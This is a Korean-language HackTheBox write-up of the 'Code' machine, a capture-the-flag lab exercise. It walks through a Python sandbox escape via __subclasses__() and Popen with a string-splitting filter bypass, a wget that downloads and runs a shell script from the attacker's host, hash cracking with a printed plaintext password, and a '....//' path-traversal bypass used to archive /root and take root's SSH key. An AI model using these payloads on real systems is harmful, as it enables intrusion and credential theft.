# Code - HackTheBox
## Recon
```bash
sudo nmap -p 22,5000 -sC -sV -vv -oA code 10.10.11.62
```
<img width="1108" height="413" alt="image" src="https://github.com/user-attachments/assets/83ff7f3b-91d8-44a4-a76d-ec2d5e5ed6f1" />

- SSH(22)
- HTTP(5000)

---
## HTTP
### banner grabbing
<img width="1058" height="322" alt="image" src="https://github.com/user-attachments/assets/6f29d0d9-ec82-402f-8f95-c2a3eb32903e" />

### Code Execution
- 파이썬 코드를 실행 가능.
<img width="479" height="320" alt="image" src="https://github.com/user-attachments/assets/bb3bc044-0c95-47c3-b05a-19f8ce846ac9" />

<br>
<br>

<img width="1078" height="145" alt="image" src="https://github.com/user-attachments/assets/bf5a4194-dd01-4ba4-99b5-3f78487424a0" />

<br>
<br>

- https://book.hacktricks.wiki/en/generic-methodologies-and-resources/python/bypass-python-sandboxes/index.html?highlight=python#misc-python
- 해당 링크에서 제시해주는 시스템 명령어를 실행하려 했으나 에러 발생.
<img width="1100" height="102" alt="image" src="https://github.com/user-attachments/assets/7830073f-ef04-4dc3-9743-7d25b3792e06" />

<br>
<br>

- 허용되는 클래스가 있는지 확인.
```python3
for c in [].__class__.__base__.__subclasses__():
    print(c.__name__);
```
<img width="1100" height="602" alt="image" src="https://github.com/user-attachments/assets/b36980d3-f6de-45d9-be0a-acd97b4f995c" />

<br>
<br>

- 문자열을 그대로 전달하면 에러가 발생하여 나눠서 합치는 식으로 전달.
- `Popen` 클래스가 존재.
```bash
for c in [].__class__.__base__.__subclasses__():
    if c.__name__.lower()=='po'+'pen':
        print("true");
```
<img width="1075" height="182" alt="image" src="https://github.com/user-attachments/assets/65886552-464d-447a-be24-9b53936fa6d2" />

<br>
<br>

- `Popen`클래스의 인덱스 확인.
```python3
i = 0;
for c in [].__class__.__base__.__subclasses__():
    if c.__name__.lower()=='po'+'pen':
        print(i);
    i+=1;
```
<img width="1100" height="178" alt="image" src="https://github.com/user-attachments/assets/6a055aba-24d1-4a59-b50c-9e9c2f8dbc67" />

<br>
<br>

- `Popen`클래스를 사용하여 ping test 시도.
```python3
[].__class__.__base__.__subclasses__()[317]('ping 10.10.16.4',shell=True);
```
<img width="715" height="133" alt="image" src="https://github.com/user-attachments/assets/fdde759b-408d-407c-ae21-2ea2a3084486" />

<br>
<br>

- ping test 성공.
<img width="1056" height="287" alt="image" src="https://github.com/user-attachments/assets/83ddbe01-2eef-4169-87b6-98c5e061919e" />

<br>
<br>

- `ex.sh`생성.
<img width="1056" height="92" alt="image" src="https://github.com/user-attachments/assets/fd33d9a0-589e-401e-87b0-7b0831e61217" />

<br>
<br>

- 로컬로부터 다운로드하여 `ex.sh`실행.
```python3
[].__class__.__base__.__subclasses__()[317]('wget http://10.10.16.4/ex.sh -O /tmp/ex.sh',shell=True);

[].__class__.__base__.__subclasses__()[317]('/bin/bash /tmp/ex.sh',shell=True);
```
<img width="749" height="119" alt="image" src="https://github.com/user-attachments/assets/1804247b-258f-4b37-ab3d-2046740addeb" />

<br>
<br>

- 셸 획득.
<img width="1057" height="182" alt="image" src="https://github.com/user-attachments/assets/ef611058-7979-4632-bd27-6563069c82aa" />

---
## Privesc
- `/home/app-production/app/instance`에서 `database.db`발견.
<img width="1057" height="102" alt="image" src="https://github.com/user-attachments/assets/4223c2b9-b8ae-451e-988e-1f87e9742159" />

<br>
<br>

- `sqlite`로 확인하여 해시 획득.
```
sqlite3 database.db

sqlite> .headers on

sqlite> .mode column

sqlite> .tables

sqlite> select * from user;
```
<img width="1057" height="254" alt="image" src="https://github.com/user-attachments/assets/5051e512-d20c-4980-adf1-861cc04de48a" />

<br>
<br>

- `hashcat`으로 크래킹하여 `martin`의 비밀번호 획득.
<img width="1057" height="89" alt="image" src="https://github.com/user-attachments/assets/32be3358-fbfd-4b43-8347-51310c854db5" />

<br>
<br>

- `/etc/passwd`에서 `martin`유저 확인.
```bash
cat /etc/passwd | grep sh$
```
<img width="1057" height="78" alt="image" src="https://github.com/user-attachments/assets/e0950ba3-4cca-4c2b-968c-633fd72ec673" />

<br>
<br>

- `martin:nafeelswordsmaster`로그인.
<img width="1057" height="78" alt="image" src="https://github.com/user-attachments/assets/3e5b0031-0726-42fe-91ba-08abf447de12" />

<br>
<br>

- 셸이 지속적으로 종료가 되어서 SSH 로그인.
```bash
ssh martin@10.10.11.62
```
<img width="1106" height="42" alt="image" src="https://github.com/user-attachments/assets/458e0de4-f0cd-472a-9c8a-7e687a059181" />

<br>
<br>

- `root`권한으로 `/usr/bin/backy.sh`실행 가능.
<img width="1106" height="135" alt="image" src="https://github.com/user-attachments/assets/f758f42e-03ba-42b4-a9b1-689faeaec52d" />

<br>
<br>

- `json`파일을 인자로 받아서 `backy`를 실행시키는 코드.
- `../`를 치환하는 코드 발견.
<img width="875" height="500" alt="image" src="https://github.com/user-attachments/assets/2cf6e137-31b6-443e-b909-b020787957ff" />

<br>
<br>

- `/home/martin/backups`에 `task.json`파일이 존재.
- `/home/app-production/app`의 백업파일을 만들어서 `/home/martin/backups` 폴더에 저장하는 코드로 판단.
<img width="1106" height="252" alt="image" src="https://github.com/user-attachments/assets/7c6907e6-b79f-4111-a2a7-1abb555e0598" />

<br>
<br>

- `../` 치환 우회를 위해서 `....//`를 넣어주고 `/root`를 백업으로 생성.
<img width="1105" height="188" alt="image" src="https://github.com/user-attachments/assets/3d082a7f-9f40-454d-b02d-77c5ec776792" />

<br>
<br>

- `backy.sh`를 실행하여 `/root`백업 생성.
```bash
sudo /usr/bin/backy.sh task.json
```
<img width="1105" height="116" alt="image" src="https://github.com/user-attachments/assets/74141ce7-92ee-4275-8f88-ae38e815b46c" />

<br>
<br>

- 로컬로 옮겨서 내부 내용 확인.
```bash
tar -xvf root.tar.bz2
```
<img width="1105" height="318" alt="image" src="https://github.com/user-attachments/assets/29e35d04-b5ca-449a-a359-d35ded951a03" />

<br>
<br>

- `.ssh`폴더의 `id_rsa`를 이용하여 `root` 로그인.
```bash
ssh -i id_rsa root@10.10.11.62
```
<img width="1105" height="46" alt="image" src="https://github.com/user-attachments/assets/aba2596d-4995-409b-bc79-0074b17e1f54" />

---
## FLAG
- `/home/app-production/user.txt`
<img width="1105" height="268" alt="image" src="https://github.com/user-attachments/assets/91184b66-433b-4b0d-8a8f-d9b29517b75e" />

<br>
<br>

- `/root/root.txt`
<img width="1105" height="289" alt="image" src="https://github.com/user-attachments/assets/3d60bc0f-4fee-4b3e-9db2-f8b59bebe2d9" />



























